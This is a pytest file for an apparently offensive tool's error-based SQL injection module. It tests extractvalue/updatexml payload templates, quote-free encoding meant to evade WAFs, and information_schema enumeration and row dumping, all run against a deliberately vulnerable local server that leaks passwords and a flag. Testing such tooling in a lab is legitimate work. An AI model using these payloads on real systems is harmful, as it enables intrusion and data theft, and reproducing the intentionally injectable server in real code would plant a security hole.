"""Error-based SQLi oracle: parse the leak, chunk long values, enumerate/dump, and
walk the wraith lab's /profile exfil sink end to end (replicated locally)."""

import html
import re
import sqlite3
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlsplit

from hickok import cli, http, sqli


# ----------------------------------------------------------------- offline
def test_error_leak_parses_after_the_marker():
    assert sqli._error_leak("<pre>XPATH syntax error: '~s3cr3t!'</pre>") == "s3cr3t!"
    assert sqli._error_leak("'~admin,alice,bob'") == "admin,alice,bob"
    assert sqli._error_leak("it&#x27;s") is None         # no marker -> channel didn't fire
    assert sqli._error_leak("") is None
    assert sqli._error_leak("'~it&#x27;s'") == "it's"    # escaped quote round-trips


def test_value_reassembles_truncated_windows():
    """A long value comes back 32 chars at a time (real extractvalue/updatexml
    truncate); the oracle reads each window and reassembles the whole."""
    secret = "DEADWOOD" * 10                              # 80 chars, spans 3 windows

    class _Trunc:
        def __init__(self):
            self.count = 0

        def get(self, url):
            self.count += 1
            payload = parse_qs(urlsplit(url).query)["id"][0]
            off = int(re.search(r",(\d+),32\)", payload).group(1))
            window = secret[off - 1:off - 1 + 32]         # emulate SUBSTRING truncation
            return f"<pre>'~{window}'</pre>"

    h = _Trunc()
    eo = sqli.ErrorOracle(h, "http://t/profile?id=1", "id", "1", "mysql", "numeric",
                          "{v} AND {e}{cm}", "extractvalue(1,concat(0x7e,{e}))")
    assert eo.read("SELECT secret") == secret
    assert h.count == 3                                   # 32 + 32 + 16


def test_value_handles_a_non_truncating_target():
    """A target that returns the whole value at once (ignoring SUBSTRING, like the
    lab) is read in a single window — not duplicated by the chunk loop."""

    class _Full:
        def __init__(self):
            self.count = 0

        def get(self, url):
            self.count += 1
            return "<pre>'~admin,alice,bob'</pre>"

    h = _Full()
    eo = sqli.ErrorOracle(h, "http://t/p?id=1", "id", "1", "mysql", "numeric",
                          "{v} AND {e}{cm}", "extractvalue(1,concat(0x7e,{e}))")
    assert eo.read("SELECT group_concat(username) FROM users") == "admin,alice,bob"
    assert h.count == 1                                   # 15 chars (< 32) -> one read


def test_error_catalog_payloads_carry_no_quote_characters():
    """The error-based catalog path encodes markers/separators/predicates quote-free
    (like UNION), so a single-quote-filtering WAF doesn't break enumeration."""
    sent = []

    class _Http:
        count = 0

        def get(self, url):
            sent.append(url)
            return ""                                     # no leak -> empty

    eo = sqli.ErrorOracle(_Http(), "http://t/p?id=1", "id", "1", "mysql", "numeric",
                          "{v} AND {e}{cm}", sqli._ERROR_FNS["mysql"][0])
    sqli.error_databases(eo)
    sqli.error_tables(eo)
    sqli.error_columns(eo, "users")
    sqli.error_dump(eo, "users", ["id", "username"])
    assert sent and all("%27" not in u and "'" not in u for u in sent)


class _FakeEO:
    """An ErrorOracle stand-in whose value() returns canned catalog data, so the
    enumerate/dump query-building and row splitting can be tested with no server."""

    dbms = "mysql"

    def __init__(self, responder):
        self.marks = sqli._new_marks()
        self._responder = responder
        self.sent = []

    def read(self, expr):
        self.sent.append(expr)
        return self._responder(expr, self.marks)


def test_error_tables_builds_information_schema_query_and_splits():
    eo = _FakeEO(lambda expr, m: m.rowsep.join(["users", "secrets", "news"]))
    assert sqli.error_tables(eo) == ["users", "secrets", "news"]
    q = eo.sent[0]
    assert "information_schema.tables" in q and "group_concat" in q.lower()


def test_error_dump_reassembles_rows():
    def responder(expr, m):
        rows = [["1", "admin"], ["2", "alice"]]
        return m.rowsep.join(m.colsep.join(r) for r in rows)

    eo = _FakeEO(responder)
    assert sqli.error_dump(eo, "users", ["id", "username"]) == [["1", "admin"], ["2", "alice"]]


# ------------------------------------------------------------- integration
def _error_lab_server():
    """A self-contained replica of the wraith lab's /profile error-based exfil sink:
    a payload carrying extractvalue/updatexml + a (SELECT ...) runs that SELECT on a
    sqlite and echoes its value back inside a 500 error after a ~ marker. Mirrors
    examples/vuln_app.py so the test doesn't depend on the wraith clone being present."""
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.executescript(
        "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT);"
        "INSERT INTO users VALUES (1,'admin','s3cr3t!'),(2,'alice','wonderland'),(3,'bob','hunter2');"
        "CREATE TABLE secrets (id INTEGER PRIMARY KEY, name TEXT, value TEXT);"
        "INSERT INTO secrets VALUES (1,'flag','HCK{the_house_always_collects}');"
    )
    lock = threading.Lock()
    sub_re = re.compile(r"\((SELECT\b(?:[^()]|\([^()]*\))*)\)", re.I)

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _reply(self, status, body):
            self.send_response(status)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            raw = (parse_qs(urlsplit(self.path).query).get("id") or ["1"])[0]
            sub = sub_re.search(raw)
            if re.search(r"extractvalue|updatexml", raw, re.I) and sub:
                try:
                    with lock:
                        row = db.execute(sub.group(1)).fetchone()
                    leaked = "" if row is None else str(row[0])
                except Exception as exc:
                    leaked = str(exc)
                return self._reply(500, f"<pre>XPATH syntax error: '~{html.escape(leaked)}'</pre>".encode())
            return self._reply(200, b"<h1>Profile</h1><p>member since 2021.</p>")

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def test_error_oracle_walks_the_profile_lab_with_ground_truth():
    """Against the lab's /profile sink: calibrate the error channel, then read the
    exact ground-truth values out of the DB error message."""
    srv = _error_lab_server()
    url = f"http://127.0.0.1:{srv.server_address[1]}/profile?id=1"
    net = http.Http(timeout=5)
    eo = sqli.error_calibrate(net, url, "id", "1", dbms="mysql")
    try:
        assert eo is not None and eo.dbms == "mysql"
        assert eo.read("SELECT password FROM users WHERE id=1") == "s3cr3t!"
        assert eo.read("SELECT group_concat(username) FROM users") == "admin,alice,bob"
        assert eo.read("SELECT value FROM secrets WHERE name='flag'") == "HCK{the_house_always_collects}"
    finally:
        srv.shutdown()


def test_sqli_target_reads_technique_and_dbms_from_handoff():
    """The wraith handoff's technique/dbms are pulled from the finding, and wraith's
    'postgresql' is mapped to hickok's 'postgres'."""
    items = [{
        "title": "SQL Injection (error-based) in 'id'",
        "target": "http://127.0.0.1:8080/profile",
        "technique": "error-based",
        "dbms": "postgresql",
    }]
    assert cli._sqli_target(items) == ("http://127.0.0.1:8080/profile", "id", "error-based", "postgres")


def test_sqli_target_is_backward_compatible_without_the_new_fields():
    """An older wraith finding (no technique/dbms) still yields url+param, with empty
    hints, so the caller falls back to trying every technique."""
    items = [{"title": "SQL Injection in 'q'", "target": "http://t/search"}]
    assert cli._sqli_target(items) == ("http://t/search", "q", "", "")


def test_cmd_sql_routes_to_error_based_and_reads_via_query(capsys, monkeypatch, tmp_path):
    """End to end through cmd_sql: `--technique error` establishes the error channel on
    the lab sink, and the REPL's `query` reads a ground-truth value through it."""
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))      # keep cache/dumps out of $HOME
    srv = _error_lab_server()
    url = f"http://127.0.0.1:{srv.server_address[1]}/profile?id=1"
    args = cli.build_parser().parse_args(
        ["sql", "-u", url, "-p", "id", "--technique", "error", "--no-color", "--no-banner"])
    feed = iter(['query "SELECT password FROM users WHERE id=1"', "exit"])
    monkeypatch.setattr("builtins.input", lambda *a: next(feed))
    try:
        cli.cmd_sql(args)
    finally:
        srv.shutdown()
    out = capsys.readouterr().out
    assert "error-based" in out                # routed to the error oracle, not boolean/time
    assert "s3cr3t!" in out                     # and read the value through the error channel


def test_error_calibrate_gives_up_without_an_error_channel():
    """A target that never reflects the marker yields no oracle, so the caller can
    fall back instead of false-positiving on a stray 500."""

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            body = b"<h1>ok</h1>"                         # never an error, never a marker
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    net = http.Http(timeout=5)
    eo = sqli.error_calibrate(net, f"http://127.0.0.1:{srv.server_address[1]}/?id=1", "id", "1")
    srv.shutdown()
    assert eo is None
